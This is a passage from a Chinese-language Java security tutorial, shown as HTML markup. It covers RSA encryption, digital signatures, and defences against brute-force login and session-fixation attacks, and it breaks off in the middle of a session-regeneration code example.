</span><span id="__span-120-10"><a id="__codelineno-120-10" name="__codelineno-120-10" href="#__codelineno-120-10"></a><span class="w">        </span><span class="n">KeyPairGenerator</span><span class="w"> </span><span class="n">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;RSA&quot;</span><span class="p">);</span>
</span><span id="__span-120-11"><a id="__codelineno-120-11" name="__codelineno-120-11" href="#__codelineno-120-11"></a><span class="w">        </span><span class="n">generator</span><span class="p">.</span><span class="na">initialize</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span><span class="w"> </span><span class="c1">// 2048位密钥</span>
</span><span id="__span-120-12"><a id="__codelineno-120-12" name="__codelineno-120-12" href="#__codelineno-120-12"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">generator</span><span class="p">.</span><span class="na">generateKeyPair</span><span class="p">();</span>
</span><span id="__span-120-13"><a id="__codelineno-120-13" name="__codelineno-120-13" href="#__codelineno-120-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-120-14"><a id="__codelineno-120-14" name="__codelineno-120-14" href="#__codelineno-120-14"></a>
</span><span id="__span-120-15"><a id="__codelineno-120-15" name="__codelineno-120-15" href="#__codelineno-120-15"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-120-16"><a id="__codelineno-120-16" name="__codelineno-120-16" href="#__codelineno-120-16"></a><span class="cm">     * 公钥加密</span>
</span><span id="__span-120-17"><a id="__codelineno-120-17" name="__codelineno-120-17" href="#__codelineno-120-17"></a><span class="cm">     */</span>
</span><span id="__span-120-18"><a id="__codelineno-120-18" name="__codelineno-120-18" href="#__codelineno-120-18"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">plaintext</span><span class="p">,</span><span class="w"> </span><span class="n">PublicKey</span><span class="w"> </span><span class="n">publicKey</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-120-19"><a id="__codelineno-120-19" name="__codelineno-120-19" href="#__codelineno-120-19"></a><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-120-20"><a id="__codelineno-120-20" name="__codelineno-120-20" href="#__codelineno-120-20"></a><span class="w">        </span><span class="n">Cipher</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;RSA/ECB/OAEPWithSHA-256AndMGF1Padding&quot;</span><span class="p">);</span>
</span><span id="__span-120-21"><a id="__codelineno-120-21" name="__codelineno-120-21" href="#__codelineno-120-21"></a><span class="w">        </span><span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">Cipher</span><span class="p">.</span><span class="na">ENCRYPT_MODE</span><span class="p">,</span><span class="w"> </span><span class="n">publicKey</span><span class="p">);</span>
</span><span id="__span-120-22"><a id="__codelineno-120-22" name="__codelineno-120-22" href="#__codelineno-120-22"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">plaintext</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">));</span>
</span><span id="__span-120-23"><a id="__codelineno-120-23" name="__codelineno-120-23" href="#__codelineno-120-23"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-120-24"><a id="__codelineno-120-24" name="__codelineno-120-24" href="#__codelineno-120-24"></a>
</span><span id="__span-120-25"><a id="__codelineno-120-25" name="__codelineno-120-25" href="#__codelineno-120-25"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-120-26"><a id="__codelineno-120-26" name="__codelineno-120-26" href="#__codelineno-120-26"></a><span class="cm">     * 私钥解密</span>
</span><span id="__span-120-27"><a id="__codelineno-120-27" name="__codelineno-120-27" href="#__codelineno-120-27"></a><span class="cm">     */</span>
</span><span id="__span-120-28"><a id="__codelineno-120-28" name="__codelineno-120-28" href="#__codelineno-120-28"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">decrypt</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="n">PrivateKey</span><span class="w"> </span><span class="n">privateKey</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-120-29"><a id="__codelineno-120-29" name="__codelineno-120-29" href="#__codelineno-120-29"></a><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-120-30"><a id="__codelineno-120-30" name="__codelineno-120-30" href="#__codelineno-120-30"></a><span class="w">        </span><span class="n">Cipher</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;RSA/ECB/OAEPWithSHA-256AndMGF1Padding&quot;</span><span class="p">);</span>
</span><span id="__span-120-31"><a id="__codelineno-120-31" name="__codelineno-120-31" href="#__codelineno-120-31"></a><span class="w">        </span><span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">Cipher</span><span class="p">.</span><span class="na">DECRYPT_MODE</span><span class="p">,</span><span class="w"> </span><span class="n">privateKey</span><span class="p">);</span>
</span><span id="__span-120-32"><a id="__codelineno-120-32" name="__codelineno-120-32" href="#__codelineno-120-32"></a><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">plaintext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">);</span>
</span><span id="__span-120-33"><a id="__codelineno-120-33" name="__codelineno-120-33" href="#__codelineno-120-33"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">);</span>
</span><span id="__span-120-34"><a id="__codelineno-120-34" name="__codelineno-120-34" href="#__codelineno-120-34"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-120-35"><a id="__codelineno-120-35" name="__codelineno-120-35" href="#__codelineno-120-35"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>应用场景：</strong>
- 数字签名
- 密钥交换
- SSL/TLS握手
- JWT签名（RS256算法）</p>
<h3 id="数字签名">数字签名<a class="headerlink" href="#数字签名" title="链接到此标题">&para;</a></h3>
<p>**定义：**使用私钥对数据进行签名，他人可用公钥验证签名，确保数据完整性和来源真实性。</p>
<p><strong>流程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>签名生成：
</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a>1. 对原始数据进行哈希计算
</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a>2. 使用私钥对哈希值加密 → 签名
</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#__codelineno-121-4"></a>
</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5" href="#__codelineno-121-5"></a>签名验证：
</span><span id="__span-121-6"><a id="__codelineno-121-6" name="__codelineno-121-6" href="#__codelineno-121-6"></a>1. 对原始数据进行哈希计算
</span><span id="__span-121-7"><a id="__codelineno-121-7" name="__codelineno-121-7" href="#__codelineno-121-7"></a>2. 使用公钥解密签名 → 得到哈希值
</span><span id="__span-121-8"><a id="__codelineno-121-8" name="__codelineno-121-8" href="#__codelineno-121-8"></a>3. 比较两个哈希值是否一致
</span></code></pre></div></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a><span class="cm">/**</span>
</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a><span class="cm"> * 数字签名示例</span>
</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#__codelineno-122-3"></a><span class="cm"> */</span>
</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#__codelineno-122-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DigitalSignature</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-122-5"><a id="__codelineno-122-5" name="__codelineno-122-5" href="#__codelineno-122-5"></a>
</span><span id="__span-122-6"><a id="__codelineno-122-6" name="__codelineno-122-6" href="#__codelineno-122-6"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-122-7"><a id="__codelineno-122-7" name="__codelineno-122-7" href="#__codelineno-122-7"></a><span class="cm">     * 生成签名</span>
</span><span id="__span-122-8"><a id="__codelineno-122-8" name="__codelineno-122-8" href="#__codelineno-122-8"></a><span class="cm">     */</span>
</span><span id="__span-122-9"><a id="__codelineno-122-9" name="__codelineno-122-9" href="#__codelineno-122-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">sign</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">PrivateKey</span><span class="w"> </span><span class="n">privateKey</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-122-10"><a id="__codelineno-122-10" name="__codelineno-122-10" href="#__codelineno-122-10"></a><span class="w">        </span><span class="n">Signature</span><span class="w"> </span><span class="n">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;SHA256withRSA&quot;</span><span class="p">);</span>
</span><span id="__span-122-11"><a id="__codelineno-122-11" name="__codelineno-122-11" href="#__codelineno-122-11"></a><span class="w">        </span><span class="n">signature</span><span class="p">.</span><span class="na">initSign</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span>
</span><span id="__span-122-12"><a id="__codelineno-122-12" name="__codelineno-122-12" href="#__codelineno-122-12"></a><span class="w">        </span><span class="n">signature</span><span class="p">.</span><span class="na">update</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">));</span>
</span><span id="__span-122-13"><a id="__codelineno-122-13" name="__codelineno-122-13" href="#__codelineno-122-13"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">signature</span><span class="p">.</span><span class="na">sign</span><span class="p">();</span>
</span><span id="__span-122-14"><a id="__codelineno-122-14" name="__codelineno-122-14" href="#__codelineno-122-14"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-122-15"><a id="__codelineno-122-15" name="__codelineno-122-15" href="#__codelineno-122-15"></a>
</span><span id="__span-122-16"><a id="__codelineno-122-16" name="__codelineno-122-16" href="#__codelineno-122-16"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-122-17"><a id="__codelineno-122-17" name="__codelineno-122-17" href="#__codelineno-122-17"></a><span class="cm">     * 验证签名</span>
</span><span id="__span-122-18"><a id="__codelineno-122-18" name="__codelineno-122-18" href="#__codelineno-122-18"></a><span class="cm">     */</span>
</span><span id="__span-122-19"><a id="__codelineno-122-19" name="__codelineno-122-19" href="#__codelineno-122-19"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verify</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">signatureBytes</span><span class="p">,</span><span class="w"> </span><span class="n">PublicKey</span><span class="w"> </span><span class="n">publicKey</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-122-20"><a id="__codelineno-122-20" name="__codelineno-122-20" href="#__codelineno-122-20"></a><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-122-21"><a id="__codelineno-122-21" name="__codelineno-122-21" href="#__codelineno-122-21"></a><span class="w">        </span><span class="n">Signature</span><span class="w"> </span><span class="n">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;SHA256withRSA&quot;</span><span class="p">);</span>
</span><span id="__span-122-22"><a id="__codelineno-122-22" name="__codelineno-122-22" href="#__codelineno-122-22"></a><span class="w">        </span><span class="n">signature</span><span class="p">.</span><span class="na">initVerify</span><span class="p">(</span><span class="n">publicKey</span><span class="p">);</span>
</span><span id="__span-122-23"><a id="__codelineno-122-23" name="__codelineno-122-23" href="#__codelineno-122-23"></a><span class="w">        </span><span class="n">signature</span><span class="p">.</span><span class="na">update</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">));</span>
</span><span id="__span-122-24"><a id="__codelineno-122-24" name="__codelineno-122-24" href="#__codelineno-122-24"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">signature</span><span class="p">.</span><span class="na">verify</span><span class="p">(</span><span class="n">signatureBytes</span><span class="p">);</span>
</span><span id="__span-122-25"><a id="__codelineno-122-25" name="__codelineno-122-25" href="#__codelineno-122-25"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-122-26"><a id="__codelineno-122-26" name="__codelineno-122-26" href="#__codelineno-122-26"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>应用场景：</strong>
- JWT签名
- API请求签名
- 软件包完整性验证
- 区块链交易</p>
<hr />
<h2 id="常见攻击方式与防护">常见攻击方式与防护<a class="headerlink" href="#常见攻击方式与防护" title="链接到此标题">&para;</a></h2>
<h3 id="1-暴力破解攻击brute-force-attack">1. 暴力破解攻击（Brute Force Attack）<a class="headerlink" href="#1-暴力破解攻击brute-force-attack" title="链接到此标题">&para;</a></h3>
<p><strong>攻击方式：</strong>
- 尝试所有可能的密码组合
- 使用常见密码字典</p>
<p><strong>防护措施：</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a><span class="cm">/**</span>
</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a><span class="cm"> * 登录失败次数限制</span>
</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a><span class="cm"> */</span>
</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#__codelineno-123-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LoginAttemptService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-5"><a id="__codelineno-123-5" name="__codelineno-123-5" href="#__codelineno-123-5"></a>
</span><span id="__span-123-6"><a id="__codelineno-123-6" name="__codelineno-123-6" href="#__codelineno-123-6"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">LoadingCache</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="o">&gt;</span><span class="w"> </span><span class="n">attemptsCache</span><span class="p">;</span>
</span><span id="__span-123-7"><a id="__codelineno-123-7" name="__codelineno-123-7" href="#__codelineno-123-7"></a>
</span><span id="__span-123-8"><a id="__codelineno-123-8" name="__codelineno-123-8" href="#__codelineno-123-8"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">LoginAttemptService</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-9"><a id="__codelineno-123-9" name="__codelineno-123-9" href="#__codelineno-123-9"></a><span class="w">        </span><span class="n">attemptsCache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CacheBuilder</span><span class="p">.</span><span class="na">newBuilder</span><span class="p">()</span>
</span><span id="__span-123-10"><a id="__codelineno-123-10" name="__codelineno-123-10" href="#__codelineno-123-10"></a><span class="w">            </span><span class="p">.</span><span class="na">expireAfterWrite</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">TimeUnit</span><span class="p">.</span><span class="na">DAYS</span><span class="p">)</span>
</span><span id="__span-123-11"><a id="__codelineno-123-11" name="__codelineno-123-11" href="#__codelineno-123-11"></a><span class="w">            </span><span class="p">.</span><span class="na">build</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">CacheLoader</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="o">&gt;</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-12"><a id="__codelineno-123-12" name="__codelineno-123-12" href="#__codelineno-123-12"></a><span class="w">                </span><span class="kd">public</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="nf">load</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-13"><a id="__codelineno-123-13" name="__codelineno-123-13" href="#__codelineno-123-13"></a><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-123-14"><a id="__codelineno-123-14" name="__codelineno-123-14" href="#__codelineno-123-14"></a><span class="w">                </span><span class="p">}</span>
</span><span id="__span-123-15"><a id="__codelineno-123-15" name="__codelineno-123-15" href="#__codelineno-123-15"></a><span class="w">            </span><span class="p">});</span>
</span><span id="__span-123-16"><a id="__codelineno-123-16" name="__codelineno-123-16" href="#__codelineno-123-16"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-123-17"><a id="__codelineno-123-17" name="__codelineno-123-17" href="#__codelineno-123-17"></a>
</span><span id="__span-123-18"><a id="__codelineno-123-18" name="__codelineno-123-18" href="#__codelineno-123-18"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-123-19"><a id="__codelineno-123-19" name="__codelineno-123-19" href="#__codelineno-123-19"></a><span class="cm">     * 记录登录失败</span>
</span><span id="__span-123-20"><a id="__codelineno-123-20" name="__codelineno-123-20" href="#__codelineno-123-20"></a><span class="cm">     */</span>
</span><span id="__span-123-21"><a id="__codelineno-123-21" name="__codelineno-123-21" href="#__codelineno-123-21"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">loginFailed</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-22"><a id="__codelineno-123-22" name="__codelineno-123-22" href="#__codelineno-123-22"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">attempts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">attemptsCache</span><span class="p">.</span><span class="na">getUnchecked</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span id="__span-123-23"><a id="__codelineno-123-23" name="__codelineno-123-23" href="#__codelineno-123-23"></a><span class="w">        </span><span class="n">attempts</span><span class="o">++</span><span class="p">;</span>
</span><span id="__span-123-24"><a id="__codelineno-123-24" name="__codelineno-123-24" href="#__codelineno-123-24"></a><span class="w">        </span><span class="n">attemptsCache</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">attempts</span><span class="p">);</span>
</span><span id="__span-123-25"><a id="__codelineno-123-25" name="__codelineno-123-25" href="#__codelineno-123-25"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-123-26"><a id="__codelineno-123-26" name="__codelineno-123-26" href="#__codelineno-123-26"></a>
</span><span id="__span-123-27"><a id="__codelineno-123-27" name="__codelineno-123-27" href="#__codelineno-123-27"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-123-28"><a id="__codelineno-123-28" name="__codelineno-123-28" href="#__codelineno-123-28"></a><span class="cm">     * 检查是否被锁定</span>
</span><span id="__span-123-29"><a id="__codelineno-123-29" name="__codelineno-123-29" href="#__codelineno-123-29"></a><span class="cm">     */</span>
</span><span id="__span-123-30"><a id="__codelineno-123-30" name="__codelineno-123-30" href="#__codelineno-123-30"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isBlocked</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-31"><a id="__codelineno-123-31" name="__codelineno-123-31" href="#__codelineno-123-31"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-32"><a id="__codelineno-123-32" name="__codelineno-123-32" href="#__codelineno-123-32"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">attemptsCache</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span><span class="w"> </span><span class="c1">// 5次失败后锁定</span>
</span><span id="__span-123-33"><a id="__codelineno-123-33" name="__codelineno-123-33" href="#__codelineno-123-33"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ExecutionException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-34"><a id="__codelineno-123-34" name="__codelineno-123-34" href="#__codelineno-123-34"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-123-35"><a id="__codelineno-123-35" name="__codelineno-123-35" href="#__codelineno-123-35"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-123-36"><a id="__codelineno-123-36" name="__codelineno-123-36" href="#__codelineno-123-36"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-123-37"><a id="__codelineno-123-37" name="__codelineno-123-37" href="#__codelineno-123-37"></a>
</span><span id="__span-123-38"><a id="__codelineno-123-38" name="__codelineno-123-38" href="#__codelineno-123-38"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-123-39"><a id="__codelineno-123-39" name="__codelineno-123-39" href="#__codelineno-123-39"></a><span class="cm">     * 登录成功，重置计数</span>
</span><span id="__span-123-40"><a id="__codelineno-123-40" name="__codelineno-123-40" href="#__codelineno-123-40"></a><span class="cm">     */</span>
</span><span id="__span-123-41"><a id="__codelineno-123-41" name="__codelineno-123-41" href="#__codelineno-123-41"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">loginSucceeded</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-42"><a id="__codelineno-123-42" name="__codelineno-123-42" href="#__codelineno-123-42"></a><span class="w">        </span><span class="n">attemptsCache</span><span class="p">.</span><span class="na">invalidate</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span id="__span-123-43"><a id="__codelineno-123-43" name="__codelineno-123-43" href="#__codelineno-123-43"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-123-44"><a id="__codelineno-123-44" name="__codelineno-123-44" href="#__codelineno-123-44"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>其他防护手段：</strong>
- 强密码策略（长度、复杂度要求）
- 验证码（CAPTCHA）
- 账户锁定策略（临时锁定/永久锁定）
- 延迟响应（随着失败次数增加延迟时间）</p>
<h3 id="2-会话固定攻击session-fixation">2. 会话固定攻击（Session Fixation）<a class="headerlink" href="#2-会话固定攻击session-fixation" title="链接到此标题">&para;</a></h3>
<p><strong>攻击流程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>1. 攻击者获取一个有效的SessionID
</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a>2. 诱骗受害者使用这个SessionID登录
</span><span id="__span-124-3"><a id="__codelineno-124-3" name="__codelineno-124-3" href="#__codelineno-124-3"></a>3. 受害者登录后，攻击者使用同一SessionID访问
</span></code></pre></div></p>
<p><strong>防护措施：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a><span class="cm">/**</span>
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a><span class="cm"> * 登录后重新生成SessionID</span>
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#__codelineno-125-3"></a><span class="cm"> */</span>
</span><span id="__span-125-4"><a id="__codelineno-125-4" name="__codelineno-125-4" href="#__codelineno-125-4"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onAuthenticationSuccess</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-125-5"><a id="__codelineno-125-5" name="__codelineno-125-5" href="#__codelineno-125-5"></a><span class="w">    </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">oldSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
</span><span id="__span-125-6"><a id="__codelineno-125-6" name="__codelineno-125-6" href="#__codelineno-125-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">oldSession</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-125-7"><a id="__codelineno-125-7" name="__codelineno-125-7" href="#__codelineno-125-7"></a><span class="w">        </span><span class="c1">// 保存旧会话数据</span>
</span><span id="__span-125-8"><a id="__codelineno-125-8" name="__codelineno-125-8" href="#__codelineno-125-8"></a><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">attributes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
</span><span id="__span-125-9"><a id="__codelineno-125-9" name="__codelineno-125-9" href="#__codelineno-125-9"></a><span class="w">        </span><span class="n">Enumeration</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">names</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oldSession</span><span class="p">.</span><span class="na">getAttributeNames</span><span class="p">();</span>
</span><span id="__span-125-10"><a id="__codelineno-125-10" name="__codelineno-125-10" href="#__codelineno-125-10"></a><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">names</span><span class="p">.</span><span class="na">hasMoreElements</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-125-11"><a id="__codelineno-125-11" name="__codelineno-125-11" href="#__codelineno-125-11"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">names</span><span class="p">.</span><span class="na">nextElement</span><span class="p">();</span>
</span><span id="__span-125-12"><a id="__codelineno-125-12" name="__codelineno-125-12" href="#__codelineno-125-12"></a><span class="w">            </span><span class="n">attributes</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">oldSession</span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="n">name</span><span class="p">));</span>
</span><span id="__span-125-13"><a id="__codelineno-125-13" name="__codelineno-125-13" href="#__codelineno-125-13"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-125-14"><a id="__codelineno-125-14" name="__codelineno-125-14" href="#__codelineno-125-14"></a>
</span><span id="__span-125-15"><a id="__codelineno-125-15" name="__codelineno-125-15" href="#__codelineno-125-15"></a><span class="w">        </span><span class="c1">// 使旧会话失效</span>
</span><span id="__span-125-16"><a id="__codelineno-125-16" name="__codelineno-125-16" href="#__codelineno-125-16"></a><span class="w">        </span><span class="n">oldSession</span><span class="p">.</span><span class="na">invalidate</span><span class="p">();</span>
</span><span id="__span-125-17"><a id="__codelineno-125-17" name="__codelineno-125-17" href="#__codelineno-125-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-125-18"><a id="__codelineno-125-18" name="__codelineno-125-18" href="#__codelineno-125-18"></a>
